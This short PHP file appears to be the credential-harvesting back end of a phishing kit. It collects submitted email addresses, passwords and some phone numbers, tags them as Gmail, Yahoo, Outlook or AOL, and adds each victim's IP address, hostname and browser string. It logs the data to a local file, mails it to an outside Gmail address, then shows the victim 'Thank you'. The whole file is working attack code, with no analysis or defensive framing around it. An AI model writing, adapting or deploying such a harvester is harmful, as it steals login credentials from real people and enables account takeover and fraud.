<?php
$ip = getenv("REMOTE_ADDR");
$time = date("m-d-Y g:i:a");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];

$message = "New Message\n";
$message .= "Email : ".$_POST['em']."\n";
$message .= "Password : ".$_POST['psw']."\n";
if($_POST['sub']=="gmail") {
	$message .= "Phone : ".$_POST['phn']."\n";
	$subject="Gmail";
}
if($_POST['sub']=="ymail") {
	$subject="Yahoomail";
}
if($_POST['sub']=="hmail") {
	$subject="Outlook";
}
if($_POST['sub']=="amail") {
	$subject="Aol";
}
if($_POST['sub']=="omail") {
	$subject="Others";
}
$message .= "HostName : ".$hostname."\n";
$message .= "IP Address $ip on $time\n";
$message .= "Browser: $useragent\n";
$message .= "----------------------By May-\n";


$to = "debra.white1000@gmail.com";
$from = "From: May <info@studio.com>";
$from .= $_POST['eMailAdd']."\n";
$from .= "MIME-Version: 1.0\n";

$file = "text.txt";
$open = fopen($file, "a");
fwrite($open, $message."\n");
fclose($open);

mail($to,$subject,$message, $from);

print "Thank you";


?>

